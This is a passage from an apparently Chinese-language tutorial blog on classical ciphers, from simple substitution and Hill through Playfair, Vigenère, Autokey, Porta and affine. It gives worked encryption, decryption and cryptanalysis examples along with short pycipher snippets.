<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文字母 : abcdefghijklmnopqrstuvwxyz</span><br><span class="line">明文字母 : phqgiumeaylnofdxjkrcvstzwb</span><br></pre></td></tr></table></figure>
<p>明文：<code>the quick brown fox jumps over the lazy dog</code></p>
<p>密文：<code>cei jvaql hkdtf udz yvoxr dsik cei npbw gdm</code></p>
<p><strong>（2）破解</strong></p>
<p>当密文数据足够多时这种密码我们可以通过字频分析方法破解或其他方法破解，比较好的在线词频分析网站<a href="http://quipqiup.com/index.php" target="_blank" rel="noopener">http://quipqiup.com/index.php</a>(翻= =墙)，这里推荐一篇通过”爬山算法”来破解简单替换密码<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-simple-substitution-cipher/" target="_blank" rel="noopener">文章</a>，基于文中的算法实现的工具来破解示例。</p>
<p>密文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pmpafxaikkitprdsikcplifhwceigixkirradfeirdgkipgigudkcekiigpwrpucikceiginasikwduearrxiiqepcceindgmieinpwdfprduppcedoikiqiasafmfddfipfgmdafmfdteiki</span><br></pre></td></tr></table></figure>
<p>解密：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1310379174.png" alt="破解简单替换密码.png"></p>
<p>(ps:score值越小越准确)</p>
<p>密钥：<code>PHQGIUMEAVLNOFDXBKRCZSTJWY</code></p>
<p>明文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AGAINPIERREWASOVERTAKENBYTHEDEPRESSIONHESODREADEDFORTHREEDAYSAFTERTHEDELIVERYOFHISSPEECHATTHELODGEHELAYONASOFAATHOMERECEIVINGNOONEANDGOINGNOWHERE</span><br></pre></td></tr></table></figure>
<p>将明文转换成可读句子：</p>
<p>again pierre was over taken by the depression he so dreaded for three day safter the delivery of his speech at the lodge he lay on a  sofa at home receiving no one and going no where</p>
<hr>
<h4><span id="5希尔密码">5.希尔密码</span></h4><p><strong>（1）介绍</strong></p>
<p>希尔密码(Hill Cipher)是基于线性代数多重代换密码，由Lester S. Hill在1929年发明。每个字母转换成26进制数字：A=0, B=1, C=2…Z=25一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。更多<a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="noopener">参考</a></p>
<p><strong>（2）加密</strong></p>
<p>明文：<code>ACT</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/372776651.png" alt="字母数字对应表.png"></p>
<p>明文对应矩阵：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4249377796.png" alt="明文对应矩阵.png"></p>
<p>加密密钥：<code>GYBNQKURP</code></p>
<p>加密矩阵：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/288821138.png" alt="加密矩阵.png"></p>
<p>计算过程：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/215139299.png" alt="计算过程.png"></p>
<p>密文：<code>FIN</code></p>
<p><strong>（3）解密</strong></p>
<p>密文：<code>FIN</code></p>
<p>计算加密矩阵的逆矩阵：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1240506286.png" alt="计算加密矩阵的逆矩阵.png"></p>
<p>解密计算：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3797557104.png" alt="解密计算.png"></p>
<p>明文：<code>ACT</code></p>
<p>至于证明和求逆可以参考线性代数知识。</p>
<p><strong>（4）破解</strong></p>
<p>密码分析一门破解编码和密码的艺术。当我们尝试去攻破希尔密码你会发现频率分析实际上没有什么用处，特别在密钥长度增多的情况下。对于较长的二元矩阵（2×2的希尔密码）频率分析可能可能会有帮助，但是对于较短的密文分析是没有实际作用的。</p>
<p>这里推荐一篇关于用<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/" target="_blank" rel="noopener">已知明文样本攻击的方式破解希尔密码</a>的文章，基础的希尔密码用<a href="https://en.wikipedia.org/wiki/Known-plaintext_attack" target="_blank" rel="noopener">已知明文攻击</a>的方式是可攻破的，由于加密完全是线性的，所以攻击者在截取到部分明文/密文字符对可以轻松建立一个线性系统，轻松搞定希尔密码，如果不能完全确定线性系统，那么只需要添加部分明文/密文对即可。已知明文攻击时最好的方式去破解写入密码，如果明文一无所知，那就进行推测猜出部分明文。基于已知明文样本攻击的方式破解希尔密码的算法的实现工具破解示例：</p>
<p>密文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XUKEXWSLZJUAXUNKIGWFSOZRAWURORKXAOSLHROBXBTKCMUWDVPTFBLMKEFVWMUXTVTWUIDDJVZKBRMCWOIWYDXMLUFPVSHAGSVWUFWORCWUIDUJCNVTTBERTUNOJUZHVTWKORSVRZSVVFSQXOCMUWPYTRLGBMCYPOJCLRIYTVFCCMUWUFPOXCNMCIWMSKPXEDLYIQKDJWIWCJUMVRCJUMVRKXWURKPSEEIWZVXULEIOETOOFWKBIUXPXUGOWLFPWUSCH</span><br></pre></td></tr></table></figure>
<p>解密：</p>
<p>解密<a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="noopener">脚本实例</a></p>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/hill-cipher/" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="6猪圈密码">6.猪圈密码</span></h4><p><strong>（1）介绍</strong></p>
<p>猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码。更多<a href="https://en.wikipedia.org/wiki/Pigpen_cipher" target="_blank" rel="noopener">参考</a></p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1221786711.jpg" alt="猪圈密码.jpg"></p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2324477870.png" alt="猪圈密码密文.png"></p>
<p>在线加密<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="noopener">传送门</a></p>
<p><strong>（2）变种</strong></p>
<p>圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种，一直被共济会圣殿骑士用。</p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2277010040.png" alt="猪圈密码变种.png"></p>
<p><strong>（3）其他变种</strong></p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/64095502.jpg" alt="猪圈密码变种1.jpg"></p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/591779880.jpg" alt="猪圈密码变种2.jpg"></p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/71234779.png" alt="猪圈密码变种3.png"></p>
<hr>
<h4><span id="7波利比奥斯方阵密码">7.波利比奥斯方阵密码</span></h4><p><strong>（1）介绍</strong></p>
<p>波利比奥斯方阵密码（Polybius Square Cipher或称波利比奥斯棋盘）是棋盘密码的一种，是利用波利比奥斯方阵进行加密的密码方式，简单的来说就是把字母排列好，用坐标(行列)的形式表现出来。字母是密文，明文便是字母的坐标。更多<a href="https://en.wikipedia.org/wiki/Polybius_square" target="_blank" rel="noopener">参考</a></p>
<p>常见的排布方式：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3110003927.png" alt="波利比奥斯方阵密码.png"></p>
<p>加密实例：</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密文：<code>442315 4145241325 1242345233 213453 2445323543 442315 31115554 143422</code></p>
<hr>
<h4><span id="8夏多密码曲折加密">8.夏多密码(曲折加密)</span></h4><p><strong>（1）介绍</strong></p>
<p>夏多密码是作者麦克斯韦·格兰特在中篇小说《死亡之链》塑造夏多这一英雄人物中所自创的密码，如下图所示：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3840747352.png" alt="夏多密码.png"></p>
<blockquote>
<p>注意，在以上所示的字母表密钥的底部，列有四个附加符号1，2，3，4.他们可以放在密文中的任何地方。每个附加符号指示，如何转动写有密文的纸张，再进行后续的加密或解密操作，直到出现另一个附加符号。可以把每个附加符号中的那根线看作是指示针，它指示了纸张的上端朝上，朝右，朝下，朝左。比如说：如果出现符号3，那么纸张就应该转动180度，使其上端朝下；</p>
<p>符号2表示纸张上端朝右，依次类推。</p>
</blockquote>
<p>源文本：<code>I AM IN DANGER SEND HELP(我有危险，速来增援)</code></p>
<p>密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/471514465.jpg" alt="夏多密码示例.jpg"></p>
<hr>
<h4><span id="9普莱菲尔密码">9.普莱菲尔密码</span></h4><p>普莱菲尔密码(Playfair Cipher)是第一种用于实际的双字替换密码，用双字加密取代了简单代换密码的单字加密，很明显这样使得密文更难破译，因为使用简单替换密码的频率分析基本没有什么作用，虽然频率分析，通常仍然可以进行，但是有25×25=625种可能而不是25种可能，可以分为三个步骤，即编制密码表、整理明文、编写译文，下面我们以明文：</p>
<p><code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>和密钥<code>CULTURE</code>为例来讲解。普莱菲尔密码又称为单方密码(Single Cipher)之后又出现它的升级版Double Playfair，也就是<a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="noopener">二方密码</a>(Two-square Cipher),在之后又有四方密码(Four-square Cipher)</p>
<p><strong>(1)编制密码表</strong></p>
<p>1.整理密钥字母<code>C U L T U R E</code>，去掉后面重复的字母得到：<code>C U L T R E</code></p>
<p>2.用上一步得到的字母自上而下来填补5乘5方表的纵列（也可横排），之后的空白按照相同的顺序用字母表中剩余的字母依次填补完整，得到如下的方格:</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2126539796.png" alt="普莱菲尔密码.png"></p>
<blockquote>
<p>这一步需要注意的要点：整理密钥字母时，如果出现”Z”，则需要去除，因为在英文里”Z”的使用频率最低，相应的如果是德文，则需将”I”与”J”当作一个字母来看待，而法语则去掉”W”或”K”。</p>
</blockquote>
<p><strong>(2)整理明文</strong></p>
<p>我们要遵循的原则是“两个一组”，得到是若干个两两成对的字母段，用到的是明文<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>与字母”<code>X</code>“：</p>
<p>1.将明文两两一组按顺序排开，得到：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO G</code></p>
<p>2.对于末尾的单个字母要加上一个”<code>X</code>“使之成对：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p>
<blockquote>
<p>这一步需要注意的要点：对于相连字母相同者，每个后面都需要加”<code>X</code>“，例如<code>TOMORROW</code>，需要写成：<code>TO MO RX RX OW</code>。</p>
</blockquote>
<p><strong>(3)编写密文</strong></p>
<p>我们要得到的密文，当然，对于每个字母对，要严格遵循如下的原则：</p>
<blockquote>
<p>1.如果两个字母在同一行则要用它右邻的字母替换，如果已在最右边，则用该行最左边的替换，如明文为”<code>CE</code>“，依据上表，应替换为”<code>EG</code>“；<br>2.如果两个字母在同一列则要用它下边的字母替换，如果已在最下边，则用该行最上边的替换，如明文为”<code>OQ</code>“，依据上表，应替换为”<code>PS</code>“；<br>3.如果两个字母在不同的行或列，则应在密码表中找两个字母使四个字母组成一个矩形，明文占据两个顶点，需用另外两个顶点的字母替换，如明文为”<code>HX</code>“，可以替换为”<code>WI/J</code>“或”<code>I/JW</code>“（下面的例子将按照横向替换原则即同行优先）。</p>
</blockquote>
<p>按照上述原则，将明文<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code>加以转换得到<code>KU ND LH GT LF WU ES PW LH SI/J NP CG CR AG BU VZ QA I/JV</code>（/表示或者，不过一般用I不用J，所以分析密文时你看25个字母都有而只差一个字母没有用到可以考虑一下这种加密方式）将得到的字母改为大写并五个一组列好，得到密文<code>KUNDL HGTLF WUESP WLHSI NPCGC RAGBU VZQAI V</code>。</p>
<p>加密解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/" target="_blank" rel="noopener">传送门</a>(ps：这里加解密是横向编制密码表)</p>
<p>加密解密实例(ps：这里加解密也是横向编制密码表)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import Playfair</span><br><span class="line">&gt;&gt;&gt;Playfair(&apos;CULTREABDFGHIKMNOPQSVWXYZ&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</span><br><span class="line">&apos;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&apos;</span><br><span class="line">&gt;&gt;&gt;Playfair(&apos;CULTREABDFGHIKMNOPQSVWXYZ&apos;).decipher(&apos;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOXIUMPSOVERTHELAZYDOGX&apos;</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="10维吉尼亚密码">10.维吉尼亚密码</span></h4><p><strong>（1）介绍</strong></p>
<p>维吉尼亚密码(Vigenère Cipher)是在单一恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换，以此来对抗字频统计，更多<a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher" target="_blank" rel="noopener">参考</a>。</p>
<p>密表：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3162839359.png" alt="维吉尼亚密码.png"></p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p>
<p>加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母’T’列和密钥字母’C’行的交点就是密文字母’V’，以此类推。</p>
<p>密文：<code>VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK</code></p>
<p><strong>（2）已知密钥加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import Vigenere</span><br><span class="line">&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</span><br><span class="line">&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;</span><br><span class="line">&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).decipher(&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</span><br></pre></td></tr></table></figure>
<p>在线加密解密<a href="http://planetcalc.com/2468/" target="_blank" rel="noopener">传送门</a></p>
<p><strong>（3）未知密钥破解</strong></p>
<p>可以参考<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="noopener">维吉尼亚密码分析</a>这篇文章，破解维吉尼亚密码第一步是确定密钥长度，维吉尼亚密码分析这篇文章里介绍了使用<a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="noopener">重合指数</a>算法来确定密钥长度，在确定密钥长度后就可以尝试确定密钥，通常我们可以使用<a href="https://en.wikipedia.org/wiki/Chi-squared_test" target="_blank" rel="noopener">卡方检验</a>来找到每个字母的偏移量，基于维吉尼亚密码分析一文中的算法实现的工具破解示例。</p>
<p>密文：<code>kiqpbkxspshwehospzqhoinlgapp</code></p>
<p>解密：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3380107861.png" alt="维吉尼亚密码破解.png"></p>
<p>(ps:结合左边的值，密钥以及解出明文可以确定kien 5或者klen 10为准确的结果)</p>
<p>明文：<code>DEFEND THE EAST WALL OF THE CASTLE</code></p>
<p><strong>（4）变种</strong></p>
<p>有几种密码和维吉尼亚密码相似，格罗斯费尔德密码(Gronsfeld cipher)实际上和维吉尼亚密码相同，除了使用了数字来代替字母以外没有什么区别。数字可以选择一种数列，如斐波那契数列，或者一些其他的伪随机序列。格罗斯费尔德密码密码分析过程和维吉尼亚密码大同小异，不过，自动密钥密码不能使用<a href="http://www.zybang.com/question/a0a1108423f63d10dbbf0c3e1bfdf3b3.html" target="_blank" rel="noopener">卡西斯基算法</a>(kasiski)来破译，因为自动密钥密码的密钥不重复循环使用，破译自动密钥密码最好的方法的就是从密文不断尝试和猜测其中明文或密钥的一部分。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/863670565.png" alt="格罗斯费尔德密码.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import Gronsfeld</span><br><span class="line">&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</span><br><span class="line">&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;</span><br><span class="line">&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).decipher(&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</span><br></pre></td></tr></table></figure>
<p>在线加解密<a href="http://rumkin.com/tools/cipher/gronsfeld.php" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="11自动密钥密码">11.自动密钥密码</span></h4><p><strong>（1）介绍</strong></p>
<p>自动密钥密码(Autokey Cipher)是多表替换密码，与维吉尼亚密码密切相关，但使用不同的方法生成密钥，通常来说要比维吉尼亚密码更安全。自动密钥密码主要有两种，关键词自动密钥密码和原文自动密钥密码.下面我们以关键词自动密钥为例：</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>关键词：<code>CULTURE</code></p>
<p>自动生成密钥：<code>CULTURE THE QUICK BROWN FOX JUMPS OVER THE</code></p>
<p>接下来的加密过程和维吉尼亚密码类似，从密表可得：</p>
<p>密文：<code>VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK</code></p>
<p><strong>（2）已知关键词加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import Autokey</span><br><span class="line">&gt;&gt;&gt;Autokey(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</span><br><span class="line">&apos;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&apos;</span><br><span class="line">&gt;&gt;&gt;Autokey(&apos;CULTURE&apos;).decipher(&apos;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</span><br></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/autokey/" target="_blank" rel="noopener">传送门</a></p>
<p><strong>（3）未知关键词破解</strong></p>
<p>推荐去看这篇<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/" target="_blank" rel="noopener">自动密钥密码分析文章</a>，基于文中的算法实现的工具来破解示例。</p>
<p>密文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isjiqymdebvuzrvwhmvysibugzhyinmiyeiklcvioimbninyksmmnjmgalvimlhspjxmgfiraqlhjcpvolqmnyynhpdetoxemgnoxl</span><br></pre></td></tr></table></figure>
<p>解密</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4089722453.png" alt="自动密钥密码破解.png"></p>
<p>(ps:从klen 13可以看出使用的关键词为’FORTIFICATION’)</p>
<p>明文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESPITEBEINGMORESECURETHANTHEVIGENERECIPHERTHEAUTOKEYCIPHERISSTILLVERYEASYTOBREAKUSINGAUTOMATEDMETHODS</span><br></pre></td></tr></table></figure>
<p>将明文转换成可读句子：</p>
<p>despite being more secure than the vigenere cipher the autokey cipher is still very easy to break using automated methods</p>
<hr>
<h4><span id="12博福特密码">12.博福特密码</span></h4><p><strong>（1）介绍</strong></p>
<p>博福特密码(Beaufort Cipher)，是一种类似于维吉尼亚密码的代换密码，由弗朗西斯·蒲福(Francis Beaufort)发明。它最知名的应用是Hagelin M-209密码机。博福特密码属于对等加密，即加密演算法与解密演算法相同。</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p>
<p>加密过程：如果第一行为明文字母，第一列为密文字母，那么沿明文字母’T’列出现密钥字母’C’的行号就是密文字母’J’，以此类推。</p>
<p>密文：<code>JNH DAJCS TUFYE ZOX CZICM OZHC BKA RUMV RDY</code></p>
<p><strong>（2）已知密钥加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import Beaufort</span><br><span class="line">&gt;&gt;&gt;Beaufort(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</span><br><span class="line">&apos;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&apos;</span><br><span class="line">&gt;&gt;&gt;Beaufort(&apos;CULTURE&apos;).decipher(&apos;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</span><br></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/beaufort/" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="13滚动密钥密码">13.滚动密钥密码</span></h4><p><strong>（1）介绍</strong></p>
<p>滚动密钥密码(Running Key Cipher)和维吉尼亚密码有着相同的加密机制，区别是密钥的选取，维吉尼亚使用的密钥简短，而且重复循环使用，与之相反，滚动密钥密码使用很长的密钥，比如引用一本书作为密钥。这样做的目的是不重复循环使用密钥，使密文更难破译，尽管如此，滚动密钥密码还是可以被攻破，因为有关于密钥和明文的统计分析模式可供利用，如果滚动密钥密码使用统计上的随机密钥来源，那么理论上是不可破译的，因为任何可能都可以成为密钥，并且所有的可能性都是相等的。</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密钥：选取C语言编程(1978版)第63页第1行”errors can occur in several places. A label has…”，去掉非字母部分作为密钥(实际选取的密钥很长，长度至少不小于明文长度)。</p>
<p>加密过程：加密过程和维吉尼亚密码加密过程相同</p>
<p>密文:<code>XYV ELAEK OFQYH WWK BYHTJ OGTC TJI DAK YESR</code></p>
<p>已知密钥在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/running-key/" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="14porta密码">14.Porta密码</span></h4><p><strong>（1）介绍</strong></p>
<p>Porta密码(Porta Cipher)是一个由意大利那不勒斯的医生Giovanni Battista della Porta发明的多表代换密码，Porta密码具有加密解密过程的是相同的特点。</p>
<p>密表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">KEYS| A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line">----|----------------------------------------------------</span><br><span class="line">A,B | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</span><br><span class="line">C,D | O P Q R S T U V W X Y Z N M A B C D E F G H I J K L</span><br><span class="line">E,F | P Q R S T U V W X Y Z N O L M A B C D E F G H I J K</span><br><span class="line">G,H | Q R S T U V W X Y Z N O P K L M A B C D E F G H I J</span><br><span class="line">I,J | R S T U V W X Y Z N O P Q J K L M A B C D E F G H I</span><br><span class="line">K,L | S T U V W X Y Z N O P Q R I J K L M A B C D E F G H</span><br><span class="line">M,N | T U V W X Y Z N O P Q R S H I J K L M A B C D E F G</span><br><span class="line">O,P | U V W X Y Z N O P Q R S T G H I J K L M A B C D E F</span><br><span class="line">Q,R | V W X Y Z N O P Q R S T U F G H I J K L M A B C D E</span><br><span class="line">S,T | W X Y Z N O P Q R S T U V E F G H I J K L M A B C D</span><br><span class="line">U,V | X Y Z N O P Q R S T U V W D E F G H I J K L M A B C</span><br><span class="line">W,X | Y Z N O P Q R S T U V W X C D E F G H I J K L M A B</span><br><span class="line">Y,Z | Z N O P Q R S T U V W X Y B C D E F G H I J K L M A</span><br></pre></td></tr></table></figure>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p>
<p>加密过程：明文字母’T’列与密钥字母’C’行交点就是密文字母’F’,以此类推。</p>
<p>密文：<code>FRW HKQRY YMFMF UAA OLWHD ALWI JPT ZXHC NGV</code></p>
<p>已知密钥在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/porta/" target="_blank" rel="noopener">传送门</a></p>
<p><strong>（2）破解</strong></p>
<p>Porta密码可以被以<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher-part-2/" target="_blank" rel="noopener">维吉尼亚密码</a>破解相类似方式进行自动攻破，破解Porta密码第一步是先确定密钥长度，这里推荐一篇关于使用<a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="noopener">重合指数算法</a>确定为维吉尼亚密钥长度<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="noopener">文章</a>。</p>
<hr>
<h4><span id="15同音替换密码">15.同音替换密码</span></h4><p><strong>（1）介绍</strong></p>
<p>同音替换密码(Homophonic Substitution Cipher)是单字母可以被其他几种密文字母同时替换的密码，通常要比标准替换密码破解更加困难，破解标准替换密码最简单的方法就是分析字母出现频率，通常在英语中字母’E’(或’T’)出现的频率是最高的，如果我们允许字母’E’可以同时被3种不同字符代替，那么就不能还是以普通字母的频率来分析破解，如果允许可代替字符越多，那么密文就会更难破译。</p>
<p>常见代换规则表：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3163726836.png" alt="同音替换密码.png"></p>
<p>明文:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密文(其中一种)：<code>6CZ KOVST XJ0MA EQY IOGL4 0W1J UC7 P9NB F0H</code></p>
<p><strong>（2）破解</strong></p>
<p>如果同音替换密码的同音词个数很多，那么破解它难度很大，通常的方法采取类似破解替换密码的”爬山算法”，除了找到一个明文字母映射几个字符之外，我们还需要确定映射了那些字符，可以尝试<a href="http://www.cs.sjsu.edu/faculty/stamp/RUA/homophonic.pdf" target="_blank" rel="noopener">2层嵌套”爬山算法”</a>来破解，外层确定映射的数量，内层确定映射字符。</p>
<hr>
<h4><span id="16仿射密码">16.仿射密码</span></h4><p><strong>（1）介绍</strong></p>
<p>仿射密码(Affine Cipher)是一种单表代换密码，字母表中的每个字母相应的值使用一个简单的数学函数映射到对应的数值，再把对应数值转换成字母。这个公式意味着每个字母加密都会返回一个相同的字母，意义着这种加密方式本质上是一种标准替代密码。因此，它具有所有替代密码的弱点。每一个字母都是通过函数（ax + b）mod m加密，其中B是位移量，为了保证仿射密码的可逆性，a和m需要满足gcd(a , m)=1，一般m为设置为26。更多<a href="https://en.wikipedia.org/wiki/Affine_cipher" target="_blank" rel="noopener">参考</a></p>
<p>常见的字母对应关系：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/297129379.png" alt="常见的字母对应关系.png"></p>
<p>下面我们以E(x) = (5x + 8) mod 26函数为例子</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4130743045.png" alt="仿射密码.png"></p>
<p>至于解密我们知道</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3422534989.png" alt="仿射密码解密1.png"></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3535566502.png" alt="仿射密码解密2.png"></p>
<p>即可得出解密结果</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2787731818.png" alt="仿射密码解密结果.png"></p>
